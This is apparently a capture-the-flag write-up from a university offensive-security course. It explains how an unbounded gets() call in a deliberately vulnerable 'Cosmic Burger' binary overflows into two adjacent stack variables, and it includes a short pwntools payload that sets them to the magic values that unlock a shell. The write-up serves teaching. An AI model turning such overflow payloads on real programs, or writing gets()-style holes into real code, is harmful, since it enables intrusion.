# Cosmic Burger

**Category:** pwn / stack variable overwrite (multi-variable) · **Course:** Offensive Security (PoliTo)

## Challenge

Two `volatile int` order-verification variables (`sauce`, `cheese`) sit next to a 32-byte `order` buffer. Matching both magic values (`0xBEEF`, `0xF00D`) grants a shell — again with no return-address control needed.

## Vulnerability

`gets(order)` is unbounded by definition — the classic banned C function — so the overflow reaches straight past `order` into both adjacent stack variables in a single write.

## Exploitation

1. Pad **40 bytes** to reach the first variable (`cheese`), which the compiler placed closer to the buffer.
2. Write `0xF00D` for `cheese`, then `0xBEEF` for `sauce`, matching the stack layout exactly.

As in `solve.py`:

```python
offset = 40
param1 = 0xBEEF    # sauce
param2 = 0xF00D    # cheese

payload = flat(
    b"A" * offset,
    p32(param2),   # cheese (closer to the buffer)
    p32(param1),   # sauce
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fno-stack-protector -O0 -g`: no canary)
- `cosmic_burger` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
